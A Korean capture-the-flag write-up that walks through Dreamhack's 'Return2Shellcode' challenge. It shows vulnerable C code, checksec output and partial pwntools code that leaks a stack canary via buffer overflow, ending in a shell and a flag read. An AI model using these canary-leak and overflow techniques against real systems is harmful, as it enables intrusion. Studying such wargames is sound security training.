# 문제 분석

파일을 다운받고 실행을 해보면

```bash
     ~/from_arch/Return2Shellcode ▓▒░         ░▒▓ max@pwnmax  08:23:35   
❯ ./r2s
Address of the buf: 0x7ffee79e2010
Distance between buf and $rbp: 96
[1] Leak the canary
Input: hi!
Your input is 'hi!
'
[2] Overwrite the return address
Input: ???
```

와 같이 인풋과 덮어쓸 반환주소값을 묻고있다.
저 부분에 적절한 값을 넣어야 플래그를 획득할 수 있을 것.

```C
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```
소스 코드는 위와 같다.

## 보호 기법 탐지하기

```bash
❯ checksec ./r2s
[*] '/home/max/from_arch/Return2Shellcode/r2s'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

```

checksec을 이용하면 위와 같이 보호 기법들을 탐지할 수 있다.
스택 카나리가 사용된 것을 확인할 수 있다.

---

# 익스플로잇 방법

## 카나리 우회
위에서 문제에 카나리가 사용되었음을 알아내었다.
따라서 우선 카나리를 우회해주어야한다. buf를 문자열로 출력해주는 부분이 있으므로 여기에 적절한 오버플로우를 발생시키면 카나리 값을 구할 수 있을 것.

## 셸 획득
어떤 워게임은 ```get_shell()```주솟값이 있으면 해당 주소 리턴으로 ~~딸깍~~이 가능하다. 그치만 여기엔 없다.

### 쉘코드
```python
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./r2s')

context.arch = 'amd64'

# [1] Get information about buf
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)
```
실행 시

```bash
python3 r2s.py
[▅] Opening connection to host3.dreamhack.games on port 11058: Trying 23.81.42[+] Opening connection to host3.dreamhack.games on port 11058: Done
[+] Address of buf: 0x7fff350225e0
[+] buf <=> sfp: 0x60
[+] buf <=> canary: 0x58
[*] Closed connection to host3.dreamhack.games port 11058
```

와 같이 나왔다.
저렇게 출력된 0x58은 카나리까지의 buf의 크기. x64니까 0x8만큼의 카나리가 있을 것이다.
카나리를 구하는 건

```python
payload = b'A'*(buf2cnry + 1)
p.sendafter(b'Input:', paylad)
p.recvuntil(payload)
cnry = u64(b'\x00' + p.recvn(7))
slog("Canary", cnry)

# Canary: 0x475c12afe7478e00
```
카나리에 대한 정보도 구했다!

이후에 카나리 릭을 통해 익스플로잇하면

```bash
[+] Canary: 0x86f389d5b5547100
[*] Switching to interactive mode
 $ ls
flag
r2s
$ file flag
$ cat flag
```
하면 바로 플래그가 나온다.
